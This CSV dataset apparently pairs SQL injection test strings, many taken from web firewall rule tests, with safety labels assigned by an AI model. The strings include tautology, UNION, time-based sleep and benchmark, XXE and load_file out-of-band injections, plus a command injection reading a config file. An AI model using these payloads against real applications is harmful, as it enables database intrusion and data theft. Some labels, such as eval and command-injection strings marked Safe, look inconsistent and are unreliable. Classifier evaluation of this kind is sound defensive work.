string,classification,Model
var=1234OR1=1,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=-1839'or'1'='1,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"var=-1839""or""1""=""2",MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=2010-01-01'+sleep(20.to_i)+' ,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=EmptyValue'and526=527,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=foo')UNIONALLselectNULL--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=foo')waitfor delay'5:0:20'--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=JKGHUKGDI8TDHLFJH72FZLFJSKFH'andsleep(12)--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=/path/to/file/unitests.txt')UNIONALLselectNULL--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"1'||(selectextractvalue(xmltype('<?xmlversion=""1.1""encoding=""UTF-8""?><!DOCTYPEroot[<!ENTITY%toyopSYSTEM""https://coreruleset.org/"">%toyop;",MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=sleep(20),Malicious-Unsafe,ChatGPT5.2 thinking
"var=unittests@coreruleset.org""sleep(10.to_i)""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"var=""|type%SystemDrive%\\config.ini|""",Safe,ChatGPT5.2 thinking
"var=""unittests@coreruleset.org""'))and(select*from(select(sleep(5)))x)--",Malicious-Unsafe,ChatGPT5.2 thinking
/1234 OR 1=1,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/2010-01-01'+sleep(20.to_i)+' ,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/EmptyValue' and 526=527,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/foo')waitfor delay'5:0:20'--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/sleep(20),MaliciousIntended-but-safe,ChatGPT5.2 thinking
"/unittests@coreruleset.org"" sleep(10.to_i) """,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"/foo/24'union+all+select+1,2,3+from+aa",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"/foo/24'union+all+select+1,2,3+from+aa/bar",MaliciousIntended-but-safe,ChatGPT5.2 thinking
/*/*/2+union+all/bar,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/foo/9'union+all/bar,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"/foo/24+union+all+select+1,2,3+from+aa/bar",MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?var=blahblah&var2=LIKE NULL,Safe,ChatGPT5.2 thinking
pay=RegExp,Safe,ChatGPT5.2 thinking
>>,Safe,ChatGPT5.2 thinking
pay=&&,Safe,ChatGPT5.2 thinking
<<,Safe,ChatGPT5.2 thinking
!=,Safe,ChatGPT5.2 thinking
||,Safe,ChatGPT5.2 thinking
XOR,Safe,ChatGPT5.2 thinking
pay=<=,Safe,ChatGPT5.2 thinking
ISNULL,Safe,ChatGPT5.2 thinking
"in(0,1)",Safe,ChatGPT5.2 thinking
"in(2147483647,-1)",Safe,ChatGPT5.2 thinking
pay=<=>,Safe,ChatGPT5.2 thinking
regexp,Safe,ChatGPT5.2 thinking
RLIKE,Safe,ChatGPT5.2 thinking
<>,Safe,ChatGPT5.2 thinking
+in+(++select+anfrage_id+from+erkenntnisse+where+id+is++not++null++),MaliciousIntended-but-safe,ChatGPT5.2 thinking
"+IN+(815914,+815913)",Safe,ChatGPT5.2 thinking
"+IN+(815919,+815920,+815921,+815922,+815923,+815924,+815925,+815926,+815927,+815928,+815929,+815930,+815932,+815933,+815934,+815935,+815936,+815937,+815917,+815918)",Safe,ChatGPT5.2 thinking
"pay=in(Aa,-Ab-,andAc)",Safe,ChatGPT5.2 thinking
>=,Safe,ChatGPT5.2 thinking
select * from user where password_last_changed not between '2021-04-11' and '2021-04-11',Safe,ChatGPT5.2 thinking
email=z'or email notnull--,Malicious-Unsafe,ChatGPT5.2 thinking
email=x' or username like totpSecret escape 'x';,Malicious-Unsafe,ChatGPT5.2 thinking
email=admin@juice-sh.op' and email ilike email--,Malicious-Unsafe,ChatGPT5.2 thinking
email=admin@juice-sh.op' and email = all (select email)--,Malicious-Unsafe,ChatGPT5.2 thinking
var=user'collate nocase--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=user'collate`nocase`--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=user'collate foo--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=user'collate`utf8mb4_general_ci`--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"var=user'collate""\utf8mb4_general_ci""--",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"var=user'collateU&""$1#B#E#D""--",MaliciousIntended-but-safe,ChatGPT5.2 thinking
email=' notnull --,MaliciousIntended-but-safe,ChatGPT5.2 thinking
email=admin@juice-sh.op'and unlikely (id)--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
text=Itishighlyunlikelythisisgoingtobeafalsepositive,Safe,ChatGPT5.2 thinking
"email=admin@juice-sh.op\' and( likelihood (id,.0));'",MaliciousIntended-but-safe,ChatGPT5.2 thinking
text=Aftercalculatingthelikelihoodthisshouldnotbematched.,Safe,ChatGPT5.2 thinking
/catalogue/rest/products/2499999||this.product/reviews,Safe,ChatGPT5.2 thinking
"var=""1"" sSOUNDS LIKE ""SOUNDS LIKE 1&other_var=test",MaliciousIntended-but-safe,ChatGPT5.2 thinking
/get?a=1=1,Safe,ChatGPT5.2 thinking
/get?a=11=1,Safe,ChatGPT5.2 thinking
/get?a=1=11,Safe,ChatGPT5.2 thinking
/get?a=11!=11,Safe,ChatGPT5.2 thinking
"/get?a=b,1=1",Safe,ChatGPT5.2 thinking
a=42 like 42,Safe,ChatGPT5.2 thinking
/get?a=This is like no other,Safe,ChatGPT5.2 thinking
/get?a=42<=>42,Safe,ChatGPT5.2 thinking
/?user=admin@juice-sh.op' and password glob password;,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/get?a=11!=1,Safe,ChatGPT5.2 thinking
/get?a=1!=11,Safe,ChatGPT5.2 thinking
/get?a=1 is not 2,Safe,ChatGPT5.2 thinking
/get?a=1 is not 1,Safe,ChatGPT5.2 thinking
a='1'notregexp'2',MaliciousIntended-but-safe,ChatGPT5.2 thinking
a='1'notregexp'1',MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?sql_table=pg_catalog,MaliciousIntended-but-safe,ChatGPT5.2 thinking
INFORMATION_SCHEMA,MaliciousIntended-but-safe,ChatGPT5.2 thinking
database(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
db_name(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
tempdb,Safe,ChatGPT5.2 thinking
msdb,Safe,ChatGPT5.2 thinking
mysql.db,Safe,ChatGPT5.2 thinking
MSysAccessObjects,Safe,ChatGPT5.2 thinking
Northwind,Safe,ChatGPT5.2 thinking
SCHEMA_NAME,Safe,ChatGPT5.2 thinking
"var=SKLJDRTZWS89E450W49NQB0W45BN""=sleep(12)=""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=1'andsleep(9)#,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=1(select*from(select(sleep(5)))d),MaliciousIntended-but-safe,ChatGPT5.2 thinking
"var=unittests@coreruleset.org'(function(){if(typeoffoo===""undefined""){vara=newDate();do{varb=newDate();}while(b-a<20000);foo=1;}}())'",Safe,ChatGPT5.2 thinking
var=test')and(select*from(select(sleep(10)))d)--,Malicious-Unsafe,ChatGPT5.2 thinking
var=config.ini'andsleep(91)#,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=None')and(select*from(select(sleep(10)))a)--,Malicious-Unsafe,ChatGPT5.2 thinking
"var=eval(compile('forxinrange(1):\nimporttime\ntime.sleep(12)','a','single'))",Safe,ChatGPT5.2 thinking
var=file:/init.ini'.sleep(12).',Safe,ChatGPT5.2 thinking
var=1)and(select*from(select(sleep(12)))a)--:1)and(select*from(select(sleep(12)))a)--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=/path/to/file/config.ini')and(select*from(select(sleep(12)))a)--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))},Safe,ChatGPT5.2 thinking
var=test{${sleep(12)}},Safe,ChatGPT5.2 thinking
"var=test""+eval(compile('forxinrange(1):\nimporttime\ntime.sleep(12)','a','single'))+""",Safe,ChatGPT5.2 thinking
"var=test""+(function(){if(typeofgs78r==='undefined'){vara=newDate();do{varb=newDate();}while(b-a<20000);gs78r=1;}}())+""",Safe,ChatGPT5.2 thinking
"var=\foobar.txt""orsleep(4)#",MaliciousIntended-but-safe,ChatGPT5.2 thinking
email=admin@juice-sh.op\' or json (id);,Malicious-Unsafe,ChatGPT5.2 thinking
email=admin@juice-sh.op\' or json_valid (id);,Malicious-Unsafe,ChatGPT5.2 thinking
"email=admin@juice-sh.op\' or glob (id,id);",Malicious-Unsafe,ChatGPT5.2 thinking
"var=foo'||(selectextractvalue(xmltype('<?xmlversion=""1.1""encoding=""UTF-8""?><!DOCTYPEroot[<!ENTITY%tocobSYSTEM""https://unit'||'tests.coreruleset.org/"">%tocob;",MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=/config.txt'(selectload_file('\\\\unittests.coreruleset.org\\zow'))',MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=(selectload_file('\\\\\\\\\\\\\\\\unitests.corerule'||'set.org\\\\\\\\hvs')),MaliciousIntended-but-safe,ChatGPT5.2 thinking
"var=,FIND_IN_SET('22',Category)",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"email=1' + 1 is likelihood(0.0,0.0) is 1--",MaliciousIntended-but-safe,ChatGPT5.2 thinking
email=admin@example.com' or sqlite_compileoption_used (id)--,Malicious-Unsafe,ChatGPT5.2 thinking
email=admin@example.com'and not sqlite_compileoption_get (id)--,Malicious-Unsafe,ChatGPT5.2 thinking
"/index.php?id=starts_with(password,'a')::int",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"/index.php?id=jsonb_pretty(...(1,password)::jsonb)::int",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"/index.php?id=...(json_build_object(1,password)::jsonb)::int",MaliciousIntended-but-safe,ChatGPT5.2 thinking
/index.php?id=unistr(password)::int,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?sql_table=sleep(534543),MaliciousIntended-but-safe,ChatGPT5.2 thinking
sleEP(3),Malicious-Unsafe,ChatGPT5.2 thinking
sleep(5000),Malicious-Unsafe,ChatGPT5.2 thinking
"BENChmARk(2999/**/999,Md5(NoW()",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"BEncHMARk(2999999,Md5(NoW('')",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"BENCHMARK(5000000,MD5(0x48416166)",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"benchmark(3000000,MD5(4)",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"pay=BENCHMARK(1000000,md5""AND1883=1883--GSCC('')",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"pay=BeNChMaRK(1000000,md5AND9796=4706('')",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"/if(now()=sysdate(),sleep(12),0)",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"/?var=SELECT BENCHMARK(1000000,1+1);",Malicious-Unsafe,ChatGPT5.2 thinking
/?var=; sleep(0),MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?var=I sleep well!,Safe,ChatGPT5.2 thinking
